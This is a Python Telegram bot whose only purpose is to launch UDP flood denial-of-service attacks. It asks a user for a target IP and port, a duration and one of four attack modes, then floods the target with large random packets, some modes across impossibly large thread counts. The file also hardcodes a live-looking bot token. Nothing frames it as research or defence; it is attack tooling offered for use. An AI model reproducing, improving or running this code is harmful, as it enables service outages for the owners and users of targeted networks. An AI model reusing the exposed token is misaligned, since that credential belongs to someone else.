import telebot
import socket
import threading
import time
import os
import random
import requests

BOT_TOKEN = '7886150281:AAHMA270bRDIi85X5O432PXpMDA1FNnfskU'
bot = telebot.TeleBot(BOT_TOKEN)


def mtt_sendreaction(bot_token, chat_id, message_id, emoji, is_big):
    url = f"https://api.telegram.org/bot{bot_token}/setMessageReaction"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "reaction": [
            {
                "type": "emoji",
                "emoji": emoji
            }
        ],
        "is_big": is_big
    }
    requests.post(url, json=payload)


def flood_udp(ip, port, duration, random_size=False):
    end_time = time.time() + duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < end_time:
            size = random.randint(100, 65507) if random_size else 65507
            data = os.urandom(size)
            s.sendto(data, (ip, port))


def multi_threaded_flood(ip, port, duration, threads=1000000000, random_size=True):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood_udp, args=(ip, port, duration, random_size))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()


def massive_attack(ip, port, duration):
    end_time = time.time() + duration
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while time.time() < end_time:
            size = random.randint(60000, 65507)  
            data = os.urandom(size)
            s.sendto(data, (ip, port))


def ultimate_attack(ip, port, duration):
    thread_list = []
    threads = 500000000000  
    print(f"Starting ultimate attack with {threads} threads...")

    for _ in range(threads):
        thread = threading.Thread(target=flood_udp, args=(ip, port, duration, True))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()
    print("Ultimate attack finished.")


@bot.message_handler(commands=['start'])
def mtt_start(message):
    chat_id = message.chat.id
    message_id = message.message_id
    emoji = "👨‍💻"
    is_big = True
    mtt_sendreaction(BOT_TOKEN, chat_id, message_id, emoji, is_big)
    bot.reply_to(message, "<b>Welcome to the UDP Flood Bot!</b> Use /attack to start an attack.", parse_mode="HTML")


@bot.message_handler(commands=['attack'])
def mtt_attack(message):
    chat_id = message.chat.id
    message_id = message.message_id
    emoji = "🔥"
    is_big = True
    mtt_sendreaction(BOT_TOKEN, chat_id, message_id, emoji, is_big)

    bot.reply_to(message, "<b>Enter target IP and port in the format IP:PORT:</b>", parse_mode="HTML")
    bot.register_next_step_handler(message, get_target)

def get_target(message):
    target = message.text.strip()
    try:
        ip_address, port_number = target.split(":")
        port_number = int(port_number)
    except ValueError:
        bot.reply_to(message, "<b>Invalid format. Please enter IP and port as IP:PORT.</b>", parse_mode="HTML")
        return

    bot.reply_to(message, "<b>Enter attack duration in seconds:</b>", parse_mode="HTML")
    bot.register_next_step_handler(message, get_duration, ip_address, port_number)

def get_duration(message, ip_address, port_number):
    duration = int(message.text.strip())
    bot.reply_to(message, "<b>Choose attack type:</b>\n1. Simple Attack\n2. Multi-threaded Attack\n3. Massive Attack\n4. Ultimate Attack", parse_mode="HTML")
    bot.register_next_step_handler(message, choose_attack, ip_address, port_number, duration)

def choose_attack(message, ip_address, port_number, duration):
    choice = message.text.strip()
    if choice == "1":
        flood_udp(ip_address, port_number, duration, random_size=True)
        bot.reply_to(message, "<b>Simple attack started!</b>", parse_mode="HTML")
    elif choice == "2":
        bot.reply_to(message, "<b>Enter number of threads:</b>", parse_mode="HTML")
        bot.register_next_step_handler(message, get_threads, ip_address, port_number, duration)
    elif choice == "3":
        massive_attack(ip_address, port_number, duration)
        bot.reply_to(message, "<b>Massive attack started!</b>", parse_mode="HTML")
    elif choice == "4":
        ultimate_attack(ip_address, port_number, duration)
        bot.reply_to(message, "<b>Ultimate attack started!</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "<b>Invalid choice.</b>", parse_mode="HTML")

def get_threads(message, ip_address, port_number, duration):
    threads = int(message.text.strip())
    multi_threaded_flood(ip_address, port_number, duration, threads, random_size=True)
    bot.reply_to(message, f"<b>Multi-threaded attack started with {threads} threads!</b>", parse_mode="HTML")


bot.polling(none_stop=True)